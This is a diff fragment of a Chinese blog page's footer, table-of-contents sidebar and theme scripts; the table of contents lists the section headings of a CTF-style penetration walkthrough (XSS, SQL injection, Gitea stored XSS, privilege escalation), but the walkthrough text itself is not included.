+      // document.getElementById('total_words').textContent = '你的博客文章总字数';
+    })();
+  </script>
+</center>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E5%88%9D%E6%AD%A5%E6%8E%A2%E6%B5%8B"><span class="toc-text">一、信息收集与初步探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-Nmap-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">1.1 Nmap 端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-Web-%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-text">1.2 Web 服务探测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%9D%E5%A7%8B%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="toc-text">二、漏洞利用与初始权限获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-git-%E6%B3%84%E9%9C%B2%E4%B8%8E%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">2.1 .git 泄露与源码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-XSS-%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98-Cookie"><span class="toc-text">2.2 XSS 获取管理员 Cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E5%88%A9%E7%94%A8-Cookie-%E8%BF%9B%E8%A1%8C-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-text">2.3 利用 Cookie 进行 SQL 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B8%8E-SSH-%E7%99%BB%E5%BD%95-rosa"><span class="toc-text">2.4 密码破解与 SSH 登录 (rosa)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E8%87%B3-axel"><span class="toc-text">三、权限提升至 axel</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">3.1 内部信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-SSH-%E7%99%BB%E5%BD%95-axel"><span class="toc-text">3.2 SSH 登录 axel</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%8F%90%E6%9D%83%E8%87%B3-Root%EF%BC%9A%E5%88%A9%E7%94%A8%E5%86%85%E9%83%A8-Gitea-%E6%9C%8D%E5%8A%A1"><span class="toc-text">四、提权至 Root：利用内部 Gitea 服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E9%98%85%E8%AF%BB%E9%82%AE%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%96%B0%E7%9B%AE%E6%A0%87"><span class="toc-text">4.1 阅读邮件，发现新目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E8%AE%BF%E9%97%AE%E5%86%85%E9%83%A8-Gitea"><span class="toc-text">4.2 端口转发访问内部 Gitea</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-Gitea-Stored-XSS-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4.3 Gitea Stored XSS 漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-%E7%AA%83%E5%8F%96-administrator-%E7%9A%84-index-php-%E6%96%87%E4%BB%B6"><span class="toc-text">4.4 窃取 administrator 的 index.php 文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5-%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E8%AF%B1%E5%AF%BC-Jobert"><span class="toc-text">4.5 发送邮件诱导 Jobert</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-%E8%8E%B7%E5%8F%96-index-php-%E5%86%85%E5%AE%B9"><span class="toc-text">4.6 获取 index.php 内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-%E5%90%8E%E7%BB%AD%E6%AD%A5%E9%AA%A4-%E8%8E%B7%E5%8F%96-root-txt"><span class="toc-text">4.7 (后续步骤 - 获取 root.txt)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">五、总结</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+  <script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+  }
+  
+
+</script>
+
+    <script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+      <script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+        <script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+          <!-- required -->
+          <script src="/js/main.js?v=1.29.1" defer></script>
+
+          <script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+            <!-- optional -->
+            
+  <script src="https://giscus.app/client.js"
+        data-repo="Zero-Yi7/blog-comments"
+        data-repo-id="R_kgDOOUyZ3Q"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOOUyZ3c4Co1L-"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+
+
+              <script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+                
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+
+
+
+                  <!-- inject -->
+                  
+
+                    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+                    <script>
+                      hljs.highlightAll();  // 这段代码会自动找到页面中所有的代码块并进行高亮
+                    </script> --><script src="/js/plugins/copycode.js"></script>
+    <script type="text/javascript" 
+      color="220,220,220" 
+      opacity="0.7" 
+      zIndex="-2" 
+      count="200" 
+      src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+    </script>
+  </div></body></html>
